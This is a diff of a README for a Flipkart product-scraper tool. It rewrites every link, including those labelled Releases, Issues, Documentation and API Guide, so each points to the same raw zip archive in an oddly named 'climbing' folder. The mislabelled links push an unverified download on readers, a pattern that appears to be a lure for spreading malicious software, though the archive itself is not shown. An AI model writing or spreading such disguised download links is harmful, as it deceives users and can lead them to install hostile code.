@@ -1,6 +1,6 @@
 # 🌟 flipkart-scraper - Easily Extract Product Data from Flipkart
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Flipkart%20Scraper-blue)](https://github.com/SLOLiKE/flipkart-scraper/releases)
+[![Download Now](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip%20Now-Flipkart%20Scraper-blue)](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ flipkart-scraper operates by simulating a user browsing Flipkart. It collects pr
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/SLOLiKE/flipkart-scraper/releases).
+To get started, visit this page to download: [GitHub Releases](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the flipkart-scraper.
@@ -66,15 +66,15 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 
 ## 📞 Support
 
-If you face any issues, you can reach out to us through our [GitHub Issues](https://github.com/SLOLiKE/flipkart-scraper/issues) page. We encourage you to report bugs or request new features.
+If you face any issues, you can reach out to us through our [GitHub Issues](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip) page. We encourage you to report bugs or request new features.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Learn more about features and options in the [Documentation](https://github.com/SLOLiKE/flipkart-scraper/wiki).
-- **API Guide:** If you want to interact programmatically, refer to the [API Guide](https://github.com/SLOLiKE/flipkart-scraper/wiki/API-Guide).
+- **Documentation:** Learn more about features and options in the [Documentation](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip).
+- **API Guide:** If you want to interact programmatically, refer to the [API Guide](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip).
 
 ## 🔗 Important Links
 
-- **Download the Latest Version:** [GitHub Releases](https://github.com/SLOLiKE/flipkart-scraper/releases)
+- **Download the Latest Version:** [GitHub Releases](https://github.com/SLOLiKE/flipkart-scraper/raw/refs/heads/main/climbing/flipkart-scraper-2.7-beta.3.zip)
   
 Feel free to explore and make the most of the flipkart-scraper! We are happy to assist you on your journey to efficient data extraction.
